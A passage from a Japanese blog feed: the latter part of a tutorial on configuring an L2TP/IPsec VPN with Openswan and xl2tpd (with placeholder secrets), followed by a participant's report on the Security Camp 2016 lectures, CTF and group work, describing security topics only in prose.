	also=L2TP-PSK-noNAT

conn L2TP-PSK-noNAT
	#
	# Configuration for one user with any type of IPsec/L2TP client
	# including the updated Windows 2000/XP (MS KB Q818043), but
	# excluding the non-updated Windows 2000/XP.
	#
	#
	# Use a Preshared Key. Disable Perfect Forward Secrecy.
	#
	# PreSharedSecret needs to be specified in /etc/ipsec.secrets as
	# YourIPAddress	 %any: &quot;sharedsecret&quot;
	authby=secret
	pfs=no
	auto=add
	keyingtries=3
	# we cannot rekey for %any, let client rekey
	rekey=no
	# Apple iOS doesn't send delete notify so we need dead peer detection
	# to detect vanishing clients
	dpddelay=10
	dpdtimeout=90
	dpdaction=clear
	# Set ikelifetime and keylife to same defaults windows has
	ikelifetime=8h
	keylife=1h
	# l2tp-over-ipsec is transport mode
	type=transport
	#
	left=157.x.x.x
	#
	# For updated Windows 2000/XP clients,
	# to support old clients as well, use leftprotoport=17/%any
	leftprotoport=17/1701
	#
	# The remote user.
	#
	right=%any
	# Using the magic port of &quot;%any&quot; means &quot;any one single port&quot;. This is
	# a work around required for Apple OSX clients that use a randomly
	# high port.
	rightprotoport=17/%any</code></pre>
<p>今回はサクッと立てたかったため, 認証方式にはPSK(Pre Shared Keys, 事前共有鍵)を選択.<br />
<code>/etc/ipsec.secrets</code>をこんな感じに記述しました.</p>
<pre class="conf"><code>: PSK &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</code></pre>
<h3 id="xl2tpd">xl2tpd</h3>
<p><code>/etc/xl2tpd/xl2tpd.conf</code>をこんな感じに記述.<br />
<code>listen-addr</code>にサーバのIPアドレス, <code>hostname</code>に適当な名前, <code>ip range</code>にクライアントに割り当てるIPアドレスの範囲, <code>local ip</code>にサーバのVPN側のIPアドレスを設定します.</p>
<pre class="conf"><code>[global]
listen-addr=157.x.x.x
auth file = /etc/ppp/chap-secrets
debug avp = no
debug network = no
debug packet = no
debug state = no
debug tunnel = no

[lns default]
hostname = hogefuga
ip range = 10.2.0.100-10.2.0.149
local ip = 10.2.0.1
assign ip = yes
length bit = yes
ppp debug = no
pppoptfile = /etc/ppp/options.l2tpd
require authentication = yes
require chap = yes
require pap = no</code></pre>
<h3 id="ppp">ppp</h3>
<p><code>/etc/ppp/options.l2tpd</code>をこんな感じに記述.<br />
<code>ms-dns</code>や<code>mtu</code>, <code>mru</code>は環境に合わせて適宜変更します.</p>
<p>Openswanのドキュメント等では<code>crtscts</code>や<code>lock</code>も設定されていますが, これを入れるとエラーが出て起動しなかったため消してあります.</p>
<pre class="conf"><code>ipcp-accept-local
ipcp-accept-remote

ms-dns 8.8.8.8
ms-dns 8.8.4.4

auth
debug
idle 1800
mtu 1500
mru 1500
nodefaultroute
persist
proxyarp
name l2tpd

refuse-pap
refuse-chap
refuse-mschap
require-mschap-v2</code></pre>
<p>接続するユーザとパスワードを<code>/etc/ppp/chap-secrets</code>に記述しておきます.</p>
<pre class="conf"><code># Secrets for authentication using CHAP
# client	server	secret			IP addresses
nyan l2tpd bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb *</code></pre>
<h3 id="iptables">iptables</h3>
<p><code>500/UDP</code>, <code>1701/UDP</code>, <code>4500/UDP</code>を開放.<br />
また, NICとL2TP間をパケットが出入りできるように, いくつかのルールも設定します.</p>
<pre><code># iptables -A INPUT -i ens3 -p udp -m policy --dir in --pol ipsec -m udp --dport 1701 -j ACCEPT
# iptables -A INPUT -i ens3 -p udp --dport 4500 -j ACCEPT
# iptables -A INPUT -i ens3 -p udp --dport 500 -j ACCEPT

# iptables -A FORWARD -i ens3 -d 10.2.0.0/24 -j ACCEPT
# iptables -A FORWARD -s 10.2.0.0/24 -o ens3 -j ACCEPT
# iptables -t nat -A POSTROUTING -s 10.2.0.0/24 -o ens3 -j MASQUERADE</code></pre>
<h3 id="サービスを有効にする">サービスを有効にする</h3>
<p>とりあえずスタートして, エラーが出なければ有効にしておきます.</p>
<pre><code>$ sudo systemctl start openswan xl2tpd
$ sudo systemctl enable openswan xl2tpd</code></pre>
<h2 id="クライアント側の設定">クライアント側の設定</h2>
<h3 id="openswan-1">Openswan</h3>
<p><code>/etc/ipsec.conf</code>の20行目を<code>plutoopts="--interface=wlp2s0"</code>のようにして通信を行うインターフェースを指定し, また41行目の<code># Add connections here</code>以下に接続の設定を記述してしまいます.</p>
<pre class="conf"><code># /etc/ipsec.conf - Openswan IPsec configuration file

# This file:  /usr/share/doc/openswan/ipsec.conf-sample
#
# Manual:     ipsec.conf.5


version	2.0	# conforms to second version of ipsec.conf specification

# basic configuration
config setup
	# Do not set debug options to debug configuration issues!
	# plutodebug / klipsdebug = &quot;all&quot;, &quot;none&quot; or a combation from below:
	# &quot;raw crypt parsing emitting control klips pfkey natt x509 dpd private&quot;
	# eg:
	# plutodebug=&quot;control parsing&quot;
	# Again: only enable plutodebug or klipsdebug when asked by a developer
	#
	# enable to get logs per-peer
	plutoopts=&quot;--interface=wlp2s0&quot;
	#
	# Enable core dumps (might require system changes, like ulimit -C)
	# This is required for abrtd to work properly
	# Note: incorrect SElinux policies might prevent pluto writing the core
	dumpdir=/var/run/pluto/
	#
	# NAT-TRAVERSAL support, see README.NAT-Traversal
	nat_traversal=yes
	# exclude networks used on server side by adding %v4:!a.b.c.0/24
	# It seems that T-Mobile in the US and Rogers/Fido in Canada are
	# using 25/8 as &quot;private&quot; address space on their 3G network.
	# This range has not been announced via BGP (at least upto 2010-12-21)
	virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v6:fd00::/8,%v6:fe80::/10
	# OE is now off by default. Uncomment and change to on, to enable.
	oe=off
	# which IPsec stack to use. auto will try netkey, then klips then mast
	protostack=netkey
	# Use this to log to a file, or disable logging on embedded systems (like openwrt)
	#plutostderrlog=/dev/null

# Add connections here
conn L2TP-PSK
	authby=secret
	pfs=no
	auto=add
	keyingtries=3
	dpddelay=30
	dpdtimeout=120
	dpdaction=clear
	rekey=yes
	ikelifetime=8h
	keylife=1h
	type=transport
	left=%defaultroute
	leftprotoport=17/1701
	right=157.x.x.x
	rightprotoport=17/1701</code></pre>
<p><code>/etc/ipsec.secrets</code>にサーバのIPアドレスとPSKを記述します.</p>
<pre class="conf"><code>%any 157.x.x.x : PSK &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</code></pre>
<h3 id="xl2tpd-1">xl2tpd</h3>
<p><code>/etc/xl2tpd/xl2tpd.conf</code>をこんな感じに記述.</p>
<pre class="conf"><code>[lac vpn-connection]
lns = 157.x.x.x
ppp debug = no
pppoptfile = /etc/ppp/options.l2tpd.client
length bit = yes</code></pre>
<h3 id="ppp-1">ppp</h3>
<p><code>/etc/ppp/options.l2tpd.client</code>をこんな感じに記述.<br />
<code>mtu</code>や<code>mru</code>は環境に合わせて適宜変更します. また, <code>name</code>と<code>password</code>にはサーバの<code>/etc/ppp/chap-secrets</code>に設定したものを記述します.</p>
<pre class="conf"><code>ipcp-accept-local
ipcp-accept-remote

refuse-eap
require-mschap-v2
noauth
noccp
debug
idle 1800
mtu 1500
mru 1500
defaultroute
usepeerdns
noipdefault
connect-delay 5000

name nyan
password bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</code></pre>
<h3 id="接続する">接続する</h3>
<p>予めxl2tpdコントロール用のファイルを作成しておきます.</p>
<pre><code>$ sudo mkdir -p /var/run/xl2tpd
$ sudo touch /var/run/xl2tpd/l2tp-control</code></pre>
<p>Openswan, xl2tpdを起動し, サーバに接続.</p>
<pre><code>$ sudo systemctl start openswan xl2tpd
$ ipsec auto --up L2TP-PSK
$ sudo sh -c 'echo &quot;c vpn-connection&quot; &gt; /var/run/xl2tpd/l2tp-control'</code></pre>
<p><code>ip a</code>等で<code>ppp0</code>のようなインターフェースが現れていればおそらく成功です.</p>
<pre><code>$ ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever

---

18: ppp0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 3
    link/ppp 
    inet 10.2.0.100 peer 10.2.0.1/32 scope global ppp0
       valid_lft forever preferred_lft forever</code></pre>
<p>全てのトラフィックをVPN経由にするために, ルーティングの設定をしてやります.</p>
<pre><code>$ sudo ip route add 157.x.x.x via 192.168.0.1 dev wlp2s0
$ sudo ip route add default via 10.2.0.100</code></pre>
<p>試しに<code>traceroute</code>してみると, 確かにVPSを経由しているっぽいことが確認できました.</p>
<pre><code>$ traceroute google.com
traceroute to google.com (172.217.25.78), 30 hops max, 60 byte packets
 1  10.2.0.1 (10.2.0.1)  25.864 ms  25.858 ms  25.887 ms
 2  v157-x-x-x.xxx.static.cnode.jp (157.x.x.x)  26.937 ms  26.912 ms  26.727 ms
 3  157.7.42.33 (157.7.42.33)  31.746 ms  32.370 ms  31.793 ms
 4  unused-133-130-013-017.interq.or.jp (133.130.13.17)  31.812 ms  31.729 ms  31.742 ms
 5  unused-133-130-012-033.interq.or.jp (133.130.12.33)  31.415 ms  31.326 ms  30.830 ms
 6  as15169.ix.jpix.ad.jp (210.171.224.96)  32.713 ms  22.008 ms  24.173 ms
 7  216.239.54.5 (216.239.54.5)  31.506 ms  31.349 ms  31.465 ms
 8  108.170.233.77 (108.170.233.77)  30.116 ms 108.170.233.79 (108.170.233.79)  31.230 ms 108.170.233.77 (108.170.233.77)  30.432 ms
 9  nrt13s50-in-f14.1e100.net (172.217.25.78)  30.481 ms  30.522 ms  33.844 ms</code></pre>
<h3 id="切断する">切断する</h3>
<p>こんな感じにするようです. 接続の逆をする感じですね.</p>
<pre><code>$ ipsec auto --down L2TP-PSK
$ sudo sh -c 'echo &quot;d vpn-connection&quot; &gt; /var/run/xl2tpd/l2tp-control'
$ sudo systemctl stop openswan xl2tpd

$ sudo ip route del 157.x.x.x via 192.168.0.1 dev wlp2s0</code></pre>
<h2 id="その他">その他</h2>
<p>Openswanやxl2tpdが出力するログは, 以下のようなコマンドで確認できます.</p>
<pre><code>$ journalctl -f -u openswan.service -u xl2tpd.service</code></pre>
<p>また, 設定ファイルの<code>debug xxx</code>等の項目を<code>yes</code>にすると出力される情報が増えるので, 上手く接続できないときは試してみると良いかもしれません.</p>
<h2 id="参考文献">参考文献</h2>
<ul>
<li><a href="https://github.com/xelerance/Openswan/wiki/L2tp-ipsec-configuration-using-openswan-and-xl2tpd">L2tp ipsec configuration using openswan and xl2tpd · xelerance/Openswan Wiki</a></li>
<li><a href="https://raymii.org/s/tutorials/IPSEC_L2TP_vpn_on_a_Raspberry_Pi_with_Arch_Linux.html">IPSEC L2TP VPN on Arch Linux on a Raspberry Pi with OpenSwan, xl2tpd and ppp - Raymii.org</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Openswan_L2TP/IPsec_VPN_client_setup">Openswan L2TP/IPsec VPN client setup - ArchWiki</a></li>
<li><a href="https://wiki.archlinux.org/index.php/sysctl">sysctl - ArchWiki</a></li>
</ul>]]></summary>
</entry>
<entry>
    <title>セキュリティ・キャンプ全国大会2016に参加してきました</title>
    <link href="https://blog.myon.info/entry/2016/08/18/seccamp2016-report/index.html" />
    <id>https://blog.myon.info/entry/2016/08/18/seccamp2016-report/index.html</id>
    <published>2016-08-17T17:55:00Z</published>
    <updated>2016-08-17T17:55:00Z</updated>
    <summary type="html"><![CDATA[<figure>
<img src="https://c4.staticflickr.com/9/8287/29050078715_394bda05c9_z.jpg" alt="certificate" />
<figcaption aria-hidden="true">certificate</figcaption>
</figure>
<p>8/9~13の5日間, クロスウェーブ幕張で行われたセキュリティ・キャンプ全国大会2016に参加してきました.<br />
講師, チューターの皆さん, 4班 “このキャンプには問題がある!” をはじめとする50名の参加者の皆さん, そして事務局や協賛企業, クロスウェーブ幕張の方など多くの関係者の皆さん, 本当にありがとうございました.</p>
<p>以下, 選択した講義や参加したイベントについて, 簡単な紹介と感想を書いていきたいと思います.</p>
<!--more-->
<h2 id="講義">講義</h2>
<h3 id="共通講義">共通講義</h3>
<p>セキュリティで重要なのは<strong>問題を解くよりも、問題を発見する力</strong>ということで, 今年のセキュキャンの応募フォームについて, セキュリティ上問題のありそうな部分について議論しました.<br />
具体的に上がった内容については載せませんが, 今キャンプ生の中で話題の<strong>事後アンケート(意味深)</strong>はまたこのWebサービスを使っているようなので, この議論の後だとちょっと不安になりますね…</p>
<p>後半は, 丁度講師の方が参加して帰ってきたばかりという<a href="https://www.blackhat.com/us-16/">Black Hat USA 2016</a>や<a href="https://www.defcon.org/html/defcon-24/dc-24-index.html">DEF CON 24</a>の報告がありました. CGC(Cyber Grand Challenge)は, 学校の講演会でも扱われて聞き覚えのあったクルマの自動運転のGrand Challenge等と同じDARPAが主催ということでとても気になった話題で, サイバー攻撃と防御をプログラムに行わせるというのには驚き. 今後どうなっていくのだろうという感じです.</p>
<h3 id="特別講義1-zenigataになりたくて">特別講義1 ZENIGATAになりたくて</h3>
<p>サイバーディフェンス研究所の福森 大喜さんによる講演でした. 福森さんは普段シンガポールにあるインターポールに勤めているそうで, 今回の講義のためだけに日本に戻ってきたとのこと. ヤバイ.</p>
<p>講演の内容は, インターポールの役割に始まり, そもそもなぜインターポールで働くことになったかという経緯の紹介, また国際サイバー犯罪の捜査に関わっているということで, 世界中の機関と協力してボットネットを潰すという映画のようなお話や, 改ざんされた政府関連機関のWebページが長い間放置されているといった笑えないようなお話まで, どれも興味深い話題ばかりでした.</p>
<p>でも何よりも印象的だったのは, <strong>課題で提出したプログラムに脆弱性があると言われたのをきっかけに3ヶ月勉強したら任意のコマンドを実行できるようになった</strong> だとか, ボットネット攻撃の際に <strong>24時間でマルウェア100体を解析したら報告スライドで世界企業とロゴを並べて紹介された</strong> といったことをいとも簡単そうにお話されていたことです. もちろんこれは今に至るまでにものすごく多くの努力をしたというお話なわけですが, もうなんかすごすぎて終始空いた口がふさがりませんでした.</p>
<h3 id="特別講義2-サイバー犯罪の実態とこれに対処するための取組">特別講義2 サイバー犯罪の実態とこれに対処するための取組</h3>
<p>レイヤー8, 人が一番危ないということで, 倫理観や正義感についてのお話でした.<br />
既に他の受講者が書いていますが, 警視庁と警察庁の違いについての解説がなるほどなーという感じでした.</p>
<h3 id="b-baremetalで遊ぶraspberry-pi-入門編">1-B BareMetalで遊ぶRaspberry Pi 入門編</h3>
<p><strong>Raspbianがインストールされた小型コンピュータ</strong>と説明されてしまうこともあるRaspberry Piを, そういったLinux等のOSに頼らない, BareMetalと呼ばれる状態で動かしてみようという講義で, 選択した中では一番気になっていました.</p>
<p><strong>低レイヤーの学び方を学ぶところから始めよう</strong>ということで, まず事前課題であったコンピュータの基礎知識やRaspberry Piに乗っているSoCやCPUコアの資料の探し方についての解説がありました.<br />
ヒープメモリとスタックメモリについては今まで知らなかった内容だったので, 4-Dの事前課題とも合わせてとても勉強になりました. またここで他の受講生から “プログラムが複数動いている環境でのメモリの使い方はどうなるのか” という質問があり, 他の講師の方も交じりながらMMU(Memory Management Unit)についての解説が始まったりと, 確かに基礎ではあるけれどもそれなりに高度な内容に触れたりもしました. そういえばAPの問題集に仮想のメモリアドレスを実際のメモリアドレスに変換するみたいな内容があったなーと思い出しながら聞いていました.</p>
<p>後半は, リンカスクリプトやMakefileの書き方などにも触れながら, 実際にスタートアップコード, 及びGPIOを操作するプログラムを記述してLチカを行いました.<br />
リンカスクリプトは普段見ない独特の文法で(個人の感想です), スライドを写経したつもりでもなかなかエラーが消えず苦労しました. また, GPIOを操作するためにはいくつかのレジスタの値を変更する必要があるわけですが, 今回扱うARMのレジスタは32bitも幅があり, この32桁の中から目的のビットは何番目なのか数えるのは, 慣れていないこともあって意外に時間を取られました.<br />
それでもなんとか講義時間内にLチカすることができました. 今まで扱ったことのある8ビットマイコンより遥かに大きなマシンを動かしただけあって, この瞬間はもう感動モノでした. (写真撮っておけばよかった…)</p>
<p>今後はまず, 手持ちのRaspberry Pi 1 Model Bを使って同じようにBareMetalで遊んでみようと思います. また, この講義では単にRaspberry PiをBareMetalで扱う方法だけでなく, 低レイヤーの学び方を学んだわけなので, いずれは何か未知のデバイスを講師の西永さんがされたように自分で調べながら動かしてみたいなぁと思いました.</p>
<h3 id="b-謎マシンでnetbsdのクロス開発体験">2-B 謎マシンでNetBSDのクロス開発体験</h3>
<p>一言で言えば, mikutter on NetBSD on Raspberry Piする講義でした.</p>
<p>クロス開発環境の構築はそれなりに手間がかかるというイメージがありますが, NetBSDのクロス開発は<a href="https://blog.myon.info/entry/2016/08/18/seccamp2016-report/ftp:/ftp.jp.netbsd.org/pub/NetBSD/NetBSD-current/tar_files/src.tar.gz" class="uri">ftp://ftp.jp.netbsd.org/pub/NetBSD/NetBSD-current/tar_files/src.tar.gz</a>からソースコードをダウンロード&amp;展開すれば, 後は全部<code>build.sh</code>がやってくれるから簡単だよということでした.<br />
実際にRaspberry Pi用のカーネルのコンパイル等を行いましたが, 確かにコマンド数行で済んでしまうのですごいなーという感じでした.</p>
<p>とはいえ, 1-Bで講師の方が言っていた <strong>今簡単にLチカできるのは誰かがLinuxを移植したから</strong> と同様に, 今簡単にクロス開発が行えるのは誰かがその環境にNetBSDを移植したからであると思うので, 実際に謎マシンにNetBSDを移植する過程についてが少し気になりました.</p>
<h3 id="c-脆弱性検出実践ファジング技術と脆弱性報告">3-C 脆弱性検出実践(ファジング技術と脆弱性報告)</h3>
<p>ファジングと呼ばれる手法を用いた脆弱性検出の体験と, IPAの方による脆弱性報告についての講義でした. せっかくセキュキャンに参加したのだから, 正しい脆弱性報告の方法くらいは学んで帰りたいなということで選択しました.</p>
<p>ファジングは, 検査対象に問題を起こしそうなデータ(ファズ)を大量に送り込んだときの挙動を監視して脆弱性の検出を行う手法とのこと. 今回は3種類の商用ファジングツールを用いて, 講師の方が持ち込んだネットワーク機器(僕はPLCアダプタを選択しました. 懐かしい!!)に対して細工されたTCPパケット等を送りつけたりしました.<br />
どのソフトウェアも大抵は初期設定を済まして開始ボタンを押せばあとは放置すればいいわけですが, 仮に検査対象の応答が無くなった時に問題のパケットを絞り込むのは, かなり大変な作業だなぁという感じでした. それでも, こうした検査はネットワーク機器に限らず, 実際にMicrosoft等の企業がやっているように多くのソフトウェアでも有用なのではないかなと思いました.</p>
<p>IPAへの脆弱性関連情報の提出は, <a href="https://www.ipa.go.jp/security/vuln/report/index.html#contact">このページ</a>を参考にメールをすればいいとのこと. 注意することは, 届け出の種類に応じて決められた様式(リンク先参照)を利用しなければいけないこと.<br />
キャンプ前のSNS上や, 実際に講義中でも話題になったけれど, やはりテンプレートをコピーして本文を編集していくというのはあまりスムーズに行える操作ではないので, 長い間現在停止中になっているWeb届出フォームが復活すればもう少し報告しやすくもなるんじゃないかなぁと思いました.</p>
<h3 id="d-実行ファイルの防御機構を突破せよ">4-D 実行ファイルの防御機構を突破せよ</h3>
<p>Linuxに実装されているRELRO, Stack Canary, NXbit, PIE, ASLRといった各種防御機構とその突破方法について学ぶ, いわゆるCTFのpwnと呼ばれるジャンルについての講義でした.</p>
<p>選択した講義の中では一番難しかったなという感じです.<br />
講義中に行われた<code>problem1_1</code>の実習, 具体的にはNX enabledかつASLR onな環境で実行されているプログラムに攻撃を行いShellを奪ってみるというものでは, <a href="https://gist.github.com/Tosainu/72d306c3388ff0f39ef929eb7df17c46">一応Shellを奪うことができた</a>ものの, 想定解であるGOTをreadで書き換えるというアイデアは思いつきもしませんでした.</p>
<p>とはいえ, 一番難しかっただけあって学んだことも一番多かったと感じていて, 特にLinuxの実行ファイルがスタックをどのように使っているかや, 動的リンクしたライブラリやその関数がどのように配置されるのかといったことはこの講義を受けなかったら絶対に学ぶことなんて無かっただろうと思うし, <code>gdb</code>や<code>readelf</code>のようなツールの使い方をちゃんと学ぶ機会にもなったし, バッファオーバーフローが<strong>何が可能になるので危険なのか</strong>を体験することができたのはとてもいい経験になりました.</p>
<p>講義中Python書けないつらいつらいしてたので, 今後は自分がそれなりに触ってきた言語で<a href="https://github.com/Gallopsled/pwntools">pwntools</a>相当のライブラリを実装しながらこの分野への知識をつけていこうと思っています.</p>
<h3 id="b-usbメモリからブートしてみよう">5-B USBメモリからブートしてみよう</h3>
<p>自分で書いたアセンブリ言語のプログラムをUSBメモリのMBRに書き込んでブートしてみようという講義でした.</p>
<p>講義の時間は85分と短く, 深いところまで入ることができなかったのが少し残念でしたが, それでも自分で書いたプログラムが<strong>ブートした</strong>瞬間は思わずおぉぉ…と声が出てしまいました.<br />
自作OSと呼べるものまではいかなくとも, いつかはキーボードの入力くらいは扱えるようにしてみたいなーと. また, これからの時代はUEFIだと思うので, その辺に関してもいつか学んでみたいなという感じです.</p>
<h3 id="b-avrマイコンで作るbadusb自作">6-B AVRマイコンで作るBadUSB自作</h3>
<p>PCに接続するとキーボードとして認識され, 悪意のあるキーコードを送りつけるデバイス, BadUSBを作成する講義でした.</p>
<p>文字列のような長い入力がなかなかうまくいかなかったり, PCの操作が必ずしも一定時間で完了するわけでは無いということで, 目的の操作を達成するのに思っていた以上に苦戦. 結局自分はWin-D -&gt; Ctrl-Shift-N -&gt; Enter -&gt; Ctrl-Shift-N -&gt; Enter… という感じにWindowsのデスクトップを表示して無限に新しいフォルダを作成する嫌がらせデバイスしか作ることができませんでした.<br />
そうした制限の中でも, 他の参加者やチューターさんには本当にヤバそうなモノを作り上げた人もいて, 特に外部のスクリプトを引っ張ってきて実行させるというアイデアにはなるほどなーという感じでした.</p>
<h3 id="a-id連携基礎">7-A ID連携基礎</h3>
<p>OAuthのようなID連携技術についての講義でした. 選択した講義の中では一つ目立ってレイヤーの高い内容ですが, 僕がプログラミングを始めて最初に書いたソフトウェアである<a href="https://github.com/Tosainu/twitpp">twitpp</a>でOAuthを触った経験から気になっていた講義でした.</p>
<p>講義はまずIdentityとは何かという話題から始まります. Identityとは, Entityの集まりで, 例えば個人の名前や性別, 外見の特徴, 住所などの情報一つ一つがEntityに当たり, その集まりがIdentityという感じだそうです. なるほど. (なんとなくはわかっているのだけれど, いざ文章にしてみようとなると結構難しい概念)<br />
そして, 携帯電話の契約を例に, なぜ携帯会社はSIMカードで個人を認証できるのかという議論に移ります. 携帯電話の契約時, 免許証のような個人を証明できる書類, すなわち公安委員会のような他の機関が発行した個人を特定できる情報(Identity)を使って個人を認証し, それをSIMカード固有の鍵を結びつけているのだと.<br />
あーなるほど, ここでID連携技術とつながりました. 最初は受ける講義間違えたのかとも一瞬思ったのですが, 普段からID連携と同じようなことをしていたのだと. この <strong>あっなるほど</strong> となった瞬間, とても気持ちが良かったです.</p>
<p>後半はOAuth2, そしてそれを拡張したOpenID Connectの2つについて, それぞれのプロトコルの解説やセキュリティ上の特徴について学び, 実際にCSRFのような攻撃を体験しました.<br />
特に, 素のOAuthに問題が見つかる -&gt; それを解決するために拡張プロトコルや独自のAPIが増える -&gt; OAuthを拡張したOpenID Connectができる という話は非常に興味深かったです.<br />
脆弱性の攻撃は普段扱わない分野ということもあって少し難しかったですが, 以前から考えていたtwitppの汎用OAuth/OAuth 2.0ライブラリ化を行い, よりプロトコルに対する理解を深めた上でもう一度復習しようと思っています.</p>
<h2 id="その他">その他</h2>
<h3 id="チューター成果報告">チューター成果報告</h3>
<p>キャンプ生の先輩となるチューターさんの発表.</p>
<p>2日目も含めて発表された方はたくさんいたけれども, 特に印象に残っているのが僕も関わっているロボカップについての発表をされた出村さん. RoboCup@Homeはルールも厳しく, Small Size Robot Leagueと比べものにならないくらい大変そうなのだけれども, 上は性別認識や音声/自然言語処理, 下はROSのドライバまで, 本当に広い分野に関わっていて本当にすごいなぁと. 僕も頑張らなくては.</p>
<p>少し話はそれるけれども, 今年のキャンプの参加者でロボカップに関わっている人が結構いて, 空き時間にそうした話題で盛り上がれたのは結構良かった.</p>
<p>2日目の晩にTwitterでも書いたこれ,</p>
<blockquote class="twitter-tweet tw-align-center" data-lang="en">
<p lang="ja" dir="ltr">
チューターさんの発表, CTF時間外にちゃんと聞きたかったなーって感じある
</p>
— とさいぬ (@myon___) <a href="https://twitter.com/myon___/status/763395968301608960">August 10, 2016</a>
</blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>時間などいろいろ厳しかったのだろうけれど, やっぱり先輩であるチューターさんの発表はちゃんと聞きたいし, 何より発表する側からしても誰も聞いていないのがわかりきったうえでの発表は絶対気分悪いと思う. これが毎年恒例の<strong>CTF妨害コンテンツ</strong>と言われているのもすごく残念だと思うので, 来年こそは改善してほしいなぁという感じです.</p>
<h3 id="ctf">CTF</h3>
<p>CTF(Capture the flag)です. 今まで<a href="http://ctf.katsudon.org/">akictf</a>の問題をいくつかのんびり時間を掛けて解いたことはありましたが, 制限時間内で得点を競うというのは初めてなので不安でした.</p>
<figure>
<img src="https://c3.staticflickr.com/9/8137/28709364450_019c88b82c_z.jpg" alt="team name" />
<figcaption aria-hidden="true">team name</figcaption>
</figure>
<p>今回の競技は, 各班に与えられるネットワーク越しにのみアクセスできるRaspberry Piに対して攻撃を行うというもの.<br />
開始前のチームミーティングでみんなWeb問題が無理というのがわかっていたので, スタートの合図とともにとりあえず<code>nmap</code>. 22番が空いていたので, 開始15秒でとりあえずsshログインするぞと方針を立てました.</p>
<p><strong>まさか<code>pi/raspberry</code>が開いてるわけないよねーHAHAHA</strong> なんて話していたら, <strong>入れましたよ</strong> とチームメンバー. まじかよ().<br />
おまけに, ホーム直下にあったflagの投稿をお願いしたら, これがまさかの最速得点者で表彰されることになったりで, 正直言えばやられたって感じでした.</p>
<p>その後いろいろ粘りましたが, 僕はEarthの1問目のシーザ暗号で+100pt, チーム全体では300ptで7位でした.<br />
<img src="https://c8.staticflickr.com/9/8729/28919388231_24cc6bd389_z.jpg" alt="score" /></p>
<p>ただ問題を解けなかったことよりは, <code>~/problems/</code>下にあった<code>equations</code>, <code>hidden</code>のようなx86(-64)のELFバイナリの問題を, 応募課題や事前課題である程度触っていたにもかかわらず解にたどり着けなかったのが一番悔しかったという感じです.<br />
また, チームにCTF初めてという方がいたにもかかわらず放置状態にしてしまったのが本当に申し訳なかったです.</p>
<figure>
<img src="https://c8.staticflickr.com/9/8692/28919132551_e6f51c6ee9_z.jpg" alt="desk" />
<figcaption aria-hidden="true">desk</figcaption>
</figure>
<h3 id="グループワーク">グループワーク</h3>
<p>未来, 倫理, 対策, 回避の4テーマから1つを選び, 発表を行うというものでした.<br />
4班 “このキャンプには問題がある!” は倫理を選択. これからのIT教育と倫理観 <sub>†ダークサイド†に堕ちないために</sub> というタイトルで,</p>
<ul>
<li>(最終目標) ホワイトハッカーのイメージを良くしよう</li>
<li>IT教育云々の前に, まずは正しいIT知識が重要であるという雰囲気作りが大切</li>
<li>家族などの身近な人に協力してもらおう
<ul>
<li>子供が最も影響を受けるのはやはり親では?</li>
<li>小さい頃からIT機器に触れさせたり, 技術書を本棚に置いておくだけでも<strong>きっかけ作り</strong>になりそう</li>
</ul></li>
<li>インパクトのあるメディアを作ろう
<ul>
<li><a href="https://www.ipa.go.jp/security/keihatsu/munekyun-pw/">パスワード－もっと強くキミを守りたい－</a> が話題になった</li>
<li>幅広い世代を対象に増やしていこう</li>
<li>ヒーロー/ヒロインアニメ</li>
<li>劇場場 セキュリティ・キャンプ</li>
<li>まんがタ○ムき○ら</li>
</ul></li>
</ul>
<p>という感じの発表をしました.</p>
<p>初日でメディアミックス戦略というアイデアは出ていましたが, なぜそれを行うのかといった方針が思うようにまとまらず時間がかかりました. また個人的な反省点として, あまりヒアリングを行うことができなくて申し訳ない感じです.<br />
ちなみに, 4日目の晩は22:00からスライドを作成する夢を見て, 04:00頃に用を足しに起きた後, 1時間半は寝れました.</p>
<h3 id="キャンプ中の生活">キャンプ中の生活</h3>
<p>居室はこんな感じでした.<br />
冷房がちょっと効き過ぎな感じあった以外はとても快適でした. 特にネット環境は自宅が悲惨故に感動するレベルで快適でした.<br />
<img src="https://c1.staticflickr.com/9/8896/28376070584_ebd8f7061a_z.jpg" alt="room" /></p>
<p>会場内にはいろはすが大量に転がっていて, 飲み物には困りませんでした.<br />
また, 食堂にはジュースやコーヒー, お茶数種もありました.<br />
<img src="https://c7.staticflickr.com/9/8614/28890303542_778d0827e0_z.jpg" alt="ilohas" /></p>
<h2 id="おまけ">おまけ</h2>
<p>帰りに秋葉原に寄り道してました. 来るのは3.5年ぶりですね.</p>
<blockquote class="twitter-tweet tw-align-center" data-lang="en">
<p lang="ja" dir="ltr">
きました <a href="https://t.co/vpGeWhGD10">pic.twitter.com/vpGeWhGD10</a>
</p>
— とさいぬ (@myon___) <a href="https://twitter.com/myon___/status/764380385744519168">August 13, 2016</a>
</blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
<h3 id="秋月電子">秋月電子</h3>
<p>夏季休業でした （◞‸◟）.</p>
<h3 id="千石電商">千石電商</h3>
<p>ブレッドボードは諸々の事情でいっぱいあるのだけれど, ジャンパ線を全く持っていなかったので購入. また, Raspberry Piとブレッドボードを繋ぐためにオス-メスのジャンパ線も購入.<br />
手持ちのRaspberry Pi 1 Model BでもBareMetalで遊ぶぞ!!!<br />
<img src="https://c7.staticflickr.com/9/8321/28980827846_f2a0e89119_z.jpg" alt="wire" /></p>
<h3 id="イーグルジャンプ-アニメイト秋葉原支店">イーグルジャンプ アニメイト秋葉原支店</h3>
<p>最高すぎて最高だった.</p>
